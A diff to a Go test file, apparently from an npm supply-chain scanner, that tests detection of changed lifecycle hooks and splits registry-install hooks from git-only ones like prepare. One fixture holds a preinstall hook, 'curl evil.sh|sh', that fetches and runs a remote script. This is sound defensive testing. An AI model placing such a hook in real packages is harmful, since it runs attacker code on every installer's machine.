@@ -121,9 +121,14 @@ func TestDepsDeltaFlags(t *testing.T) {
 func TestLifecycleDelta(t *testing.T) {
 	old := &Package{Scripts: map[string]string{"test": "mocha", "postinstall": "node x.js"}}
 	niu := &Package{Scripts: map[string]string{"test": "mocha", "postinstall": "node y.js", "preinstall": "curl evil.sh|sh"}}
-	delta := LifecycleDelta(old, niu)
+	delta, gitOnly := LifecycleDelta(old, niu)
 	if len(delta) != 2 {
 		t.Fatalf("delta = %+v", delta)
+	}
+	// prepare/prepack fire only for a git/link/file source, so they are never
+	// mixed into the install set
+	if len(gitOnly) != 0 {
+		t.Errorf("gitOnly = %+v", gitOnly)
 	}
 	// non-lifecycle scripts (test) must not appear
 	for _, c := range delta {
@@ -171,7 +176,7 @@ func TestPresentHelpers(t *testing.T) {
 		Scripts: map[string]string{"postinstall": "node s.js", "test": "mocha"},
 		Deps:    map[string]string{"a": "^1.0.0", "b": "github:evil/b"},
 	}
-	life := LifecyclePresent(p)
+	life, _ := LifecyclePresent(p)
 	if len(life) != 1 || life[0].Key != "postinstall" || life[0].Status != "present" {
 		t.Errorf("LifecyclePresent = %+v", life)
 	}
@@ -208,5 +213,21 @@ func TestEntrypoints(t *testing.T) {
 	// bin scripts are entrypoints too
 	if got := Entrypoints(&Package{Name: "x", Main: "./index.js", Bin: []byte(`{"tool":"./cli.js"}`)}); len(got) != 2 || got[1] != "cli.js" {
 		t.Errorf("bin entrypoint = %v", got)
+	}
+}
+
+// A package whose only hook is `prepare` runs nothing on a registry install:
+// that hook needs a git, link or file source.
+func TestLifecycleSplitByActivationPath(t *testing.T) {
+	p := &Package{Scripts: map[string]string{"prepare": "husky install", "prepack": "npm run build"}}
+	install, gitOnly := LifecyclePresent(p)
+	if len(install) != 0 {
+		t.Errorf("install = %+v, want none", install)
+	}
+	if len(gitOnly) != 2 {
+		t.Errorf("gitOnly = %+v", gitOnly)
+	}
+	if !InstallActive("postinstall") || InstallActive("prepare") {
+		t.Error("InstallActive must cover the registry hooks only")
 	}
 }
